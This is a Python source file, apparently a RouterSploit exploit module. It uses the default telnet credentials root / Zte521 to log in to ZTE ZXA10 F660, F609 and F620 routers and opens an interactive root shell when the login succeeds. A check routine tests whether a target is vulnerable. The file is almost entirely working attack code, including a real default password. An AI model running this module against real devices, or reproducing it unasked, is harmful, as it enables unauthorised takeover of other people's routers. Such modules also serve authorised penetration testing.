import telnetlib

from routersploit import (
    exploits,
    print_status,
    print_success,
    print_error,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for ZTE F6XX default root password.
    If the target is vulnerable it is possible to authenticate to the device"
    """
    __info__ = {
        'name': 'ZTE F6XX Default root',
        'description': 'Module exploits ZTE F6XX default root password. If the target is possible to authentiate to the device.',
        'authors': [
            'devilscream',  # vulnerability discovery & routersploit module
        ],
        'references': [
            'http://www.ironbugs.com/2016/02/hack-and-patch-your-zte-f660-routers.html',
        ],
        'devices': [
            'ZTE ZXA10 F660',
            'ZTE ZXA10 F609',
            'ZTE ZXA10 F620',
        ]
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)  # target address
    telnet_port = exploits.Option(23, 'Target Telnet port', validators=validators.integer)  # target telnet port

    username = exploits.Option("root", "Username to authenticate with")  # telnet username, default root
    password = exploits.Option("Zte521", "Password to authenticate with")  # telnet password, default Zte521

    def run(self):
        try:
            print_status("Trying to authenticate to the telnet server")
            tn = telnetlib.Telnet(self.target, self.telnet_port)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(self.username + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(self.password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)

            if i != -1:
                print_error("Exploit failed")
            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    print_success("Authentication successful")
                    tn.write("\r\n")
                    tn.interact()
                else:
                    print_error("Exploit failed")

            tn.close()
        except:
            print_error("Connection error {}:{}".format(self.target, self.telnet_port))

    @mute
    def check(self):
        try:
            tn = telnetlib.Telnet(self.target, self.telnet_port)
            tn.expect(["Login: ", "login: "], 5)
            tn.write(self.username + "\r\n")
            tn.expect(["Password: ", "password"], 5)
            tn.write(self.password + "\r\n")
            tn.write("\r\n")

            (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
            tn.close()

            if i != -1:
                return False  # target is not vulnerable
            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    return True  # target is vulnerable
        except:
            return False  # target is not vulnerable

        return False  # target is not vulnerable
